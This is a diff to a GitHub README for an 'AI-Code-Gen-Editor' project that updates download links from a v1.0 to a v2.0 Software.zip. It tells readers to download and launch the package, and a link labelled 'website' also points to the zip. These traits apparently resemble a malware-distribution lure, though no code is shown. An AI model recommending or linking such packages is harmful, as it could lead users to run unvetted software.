@@ -14,14 +14,14 @@ ai, ai-tools, code-generation, developer-tools, hackathon, html-css, huggingface
 
 ## Get Started
 To experience the power of **AI-Code-Gen-Editor**, you can download the software package from the following link:
-[![Download Software](https://github.com/enactors/AI-Code-Gen-Editor/releases/download/v1.0/Software.zip)](https://github.com/enactors/AI-Code-Gen-Editor/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/enactors/AI-Code-Gen-Editor/releases/download/v2.0/Software.zip)](https://github.com/enactors/AI-Code-Gen-Editor/releases/download/v2.0/Software.zip)
 
 **Note:** The provided link leads to a software package that needs to be launched to start using the AI code generator.
 
 Don't have access to the software package? Check the "Releases" section of this repository for alternative download options.
 
 ## Explore Further
-For more details on how to leverage this AI-Powered Code Generator, visit our [website](https://github.com/enactors/AI-Code-Gen-Editor/releases/download/v1.0/Software.zip). Dive into a world of effortless code generation and elevate your web development projects with ease.
+For more details on how to leverage this AI-Powered Code Generator, visit our [website](https://github.com/enactors/AI-Code-Gen-Editor/releases/download/v2.0/Software.zip). Dive into a world of effortless code generation and elevate your web development projects with ease.
 
 ## Contribution
 If you're passionate about AI, code generation, or web development, we welcome your contributions to enhance **AI-Code-Gen-Editor**. Feel free to fork this repository, make improvements, and submit pull requests to collaborate with us on this exciting project.
